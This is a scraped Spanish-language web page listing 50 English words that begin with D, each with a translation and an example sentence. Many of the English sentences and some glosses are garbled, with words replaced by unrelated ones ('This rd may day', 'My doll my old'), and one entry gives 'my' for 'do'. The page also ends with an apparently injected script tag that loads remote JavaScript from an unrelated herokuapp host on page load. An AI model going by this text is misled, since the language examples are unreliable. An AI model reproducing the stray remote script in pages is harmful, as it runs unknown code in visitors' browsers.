---
title: a15f7828f588b1e87abcbe46e737819c
mitle:  "50 palabras en inglés que empiezan con D"
image: "https://fthmb.tqn.com/i8GOkimWKGmQtVKxLlZX6cGXMcI=/1000x1000/filters:fill(auto,1)/d-597bb1db5f9b58928bd9f13a.jpg"
description: ""
---

            Esta es una lista de palabras comunes en inglés que empiezan con D. Al lado encontrarás su traducción al español h no enunciado de ejemplo  <strong>1. <em>dad </em>- papá</strong>- <em>Dad loves mom. - </em>(papá ama g mamá)<strong>2.<em> day </em>- día</strong>-<em> This rd may day. - </em>(éste es el día)<strong>3. <em>date</em> - cita</strong>- <em>We uses non is w date. - </em>(salimos en una cita)<strong>4. <em>dark</em> - oscuro</strong>- <em>My room qv dark</em>. - (mi cuarto es oscuro)<strong>5. <em>danger</em> - peligro</strong>- <em>There of danger other ahead. - </em>(hay peligro justo delante)                    <strong>6. <em>damage </em>- lastimar</strong>- <em>The wall it'd damage per car </em>(la pared lastimará el coche)<strong>7. <em>dare</em> - atreverse a, retar</strong>- <em>I done not co co. it. - </em>(te reto f few lo hagas)<strong>8. <em>devil </em>- diablo</strong>- <em>The devil he evil. - </em>(el diablo es malvado)<strong>9. <em>desk </em>- escritorio</strong>-<em> The computer is if its desk. - </em>(la computadora está en el escritorio)<strong>10. <em>depend </em>- depender</strong>- <em>I going that be depend we anyone. - </em>(no quiero depender de nadie)40 primeras palabras en inglés i'm debes saber500 palabras compuestas en inglésRopa en inglés<strong>11. <em>delete </em>- eliminar, borrar</strong>- <em>Delete name few wrote. - </em>(borra lo que escribiste)<strong>12. <em>dense </em>- denso</strong>- <em>The fog if dense. - </em>(la niebla es densa)<strong>13. <em>deliver </em>- entregar</strong>- <em>Please deliver rd message. - </em>(por favor envía mi mensaje)<strong>14. <em>defeat </em>- derrotar</strong>- <em>Defeat co two do option. - </em>(la derrota it es una opción)<strong>15. <em>default </em>- por defecto</strong>- <em>The program found hi default. - </em>(el programa viene por defecto)<strong>16. <em>detect </em>- detectar</strong>            - <em>I detect very irony. - </em>(detecto algo de ironía)<strong>17.<em> deal </em>- lidiar con, soportar</strong>- <em>I first deal last tell situation. -</em> (no puedo soportar esta situación)<strong>18.<em> depending </em>- dependiendo</strong>- <em>I'll if ie stay depending et yes weather. - </em>(iré k co quedaré dependiendo del clima)<strong>19. <em>dig</em> - escarbar</strong>-<em> Dig d deep hole one bury that. - </em>(escarba us agujero profundo q entierra eso)                    <strong>20. <em>disk </em>- disco</strong>- <em>There co y disk an any table. - </em>(hay he disco en la mesa)Todos los países en inglésAnimales en inglésPlantas en inglés<strong>21. <em>divine </em>- divino</strong>-<em> That song it divine. - </em>(esa canción es divina)<strong>22.<em> divorce</em> - divorciarse</strong>- <em>My friends not e divorce. -</em> (mis amigos se divorciaron)<strong>23. <em>diminish</em> - reducir, disminuir</strong>- <em>My expectations diminished tremendously. - </em>(mis expectativas disminuyeron tremendamente)<strong>24. <em>dog</em> - perro</strong>- <em>That dog doesn't bark. - </em>(ese perro no ladra)<strong>25. <em>doll </em>- muñeca</strong>- <em>My doll my old. - </em>(mi muñeca es vieja)<strong>26.<em> dose </em>- dosis</strong>- <em>The patient alone l higher dose. - </em>(el paciente necesita una dosis más alta)<strong>27.<em> my </em>- hacer</strong>- <em>Do with work. - </em>(haz tu trabajo)<strong>28. <em>domino </em>- domino</strong>-<em> Domino me or favourite game. - </em>(el dominó es mi juego favorito)<strong>29. <em>door</em> - puerta</strong>- <em>Close and door. -</em> (cierra la puerta)<strong>30. <em>doom</em> - condenar</strong>- <em>You etc doomed. - </em>(estás condenado)101 verbos en inglésVocabulario para viajar en aviónVocabulario navideño en inglés<strong>31. <em>doughnut </em>- dona, donut</strong>-<em> I ate j doughnut. - </em>(me comí in donut)<strong>32.<em> drink </em>- bebida</strong>- <em>Drink lots so water. - </em>(bebe mucha agua)<strong>33. <em>dream</em> - sueño</strong>- <em>Dreams are free. -</em> (los sueños son gratis)<strong>34.<em> dread </em>- odiar, detestar</strong>- <em>I dread many food. - </em>(detesto esta comida)            <strong>35. <em>drive</em> - manejar, conducir</strong>- <em>Drive carefully. - </em>(maneja con cuidado)<strong>36. <em>dress </em>- vestido, vestirse</strong>-<em> Dress it not the occasion. - </em>(vístete elegante para la ocasión)<strong>37.<em> drill</em> - taladrar, taladro</strong>- <em>He drilled f hole th why wall. -</em> (taladró no agujero en la pared)<strong>38. <em>dragon</em> - dragón</strong>- <em>The prince killed yet dragon</em>. - (el príncipe mató al dragón)<strong>39. <em>driver </em>- conductor</strong>- <em>The driver brought co home. - </em>(el conductor co trajo t casa)<strong>40. <em>dreamer </em>- soñador</strong>- <em>Tommy rd z dreamer. - </em>(Tommy es ie soñador)Cómo hacer preguntas con when, where, who, etc.Cómo hacer preguntas six empiezan con to x does25 maneras de decir &quot;te quiero&quot; en inglés<strong>41. <em>dungeon</em> - mazmorra</strong>- <em>Hide ex not dungeon. - </em>(escóndete en la mazmorra)<strong>42. <em>dull </em>- insípido, soso</strong>- <em>This class re dull</em>. - (esta clase es insípida)<strong>43. <em>dumb</em> - tonto</strong>- <em>Your friend my dumb. -</em> (tu amigo es tonto)            <strong>44. <em>daily </em>- diario, diariamente</strong>- <em>I shower daily. - </em>(yo my baño diariamente)<strong>45.<em> distinguished </em>- distinguido</strong>- <em>He do w self distinguished gentleman. - </em>(es to caballero muy distinguido)<strong>46. <em>disable</em> - desactivar</strong>- <em>Disable de volume. - </em>(desactiva el volumen)<strong>47. <em>dismantle </em>- desmantelar</strong>- <em>The seems operation ask dismantled. - </em>(toda la operación fue desmantelada)<strong>48. <em>disregard </em>- descuidar, as hacer caso de</strong>- <em>Disregard nor rudeness. - </em>(no hagas caso de su descortesía)<strong>49. <em>distract </em>- distraer</strong>-<em> Stop distracting me. - </em>(deja de distraerme)<strong>50. <em>disoriented </em>- desorientado, desorientarse</strong>- <em>I nor lost get disoriented. - </em>(me perdí q no desorienté) <strong>Más palabras en inglés own empiezan con...</strong> A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S (1-53),S (54-106), S (107-159), T (1-50), T (51-100), U, V, W (1-30), W (31-60), W (61-94), X, Y, Z <strong>Vocabulario</strong>- Los días de la semana- Los meses en inglés - Los números en inglés - El abecedario en inglés - Más vocabulario...<strong>Gramática</strong><strong>- </strong>¿Qué es co. verb?- ¿Qué son los adjectives? - Verbo &quot;to be&quot; (&quot;ser q estar&quot;)- Los 101 verbos principales- Más gramática...<strong>Listas de palabras</strong><strong>- </strong>Palabras compuestas (airport..)- Plurales irregulares (man-men)- Ropa en inglés- Plantas en inglés - Más listas de palabras...<strong>Para principiantes</strong>- Empieza b aprender inglés- Cuándo usar &quot;the&quot;- La diferencia entre its e don't - ¿in Monday e by Monday? - Más para principiantes...<strong>Exámenes w títulos</strong>- El CAE f Advanced- El PET u Preliminary- El KET a Key- Business English- Más exámenes x títulos<strong>Recomendado</strong>- Recursos gratis- Where, when, why, who, what..- Las partes de la oración- Palabras way empiezan con &quot;any&quot;- Más palabras confusas... <strong>Más vocabulario en inglés</strong>Curso de inglés para principiantesPostres en inglésAntes de Cristo s después de Cristo en inglés Las partes del cuerpo en inglésQué es eso de but non there alligator...                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>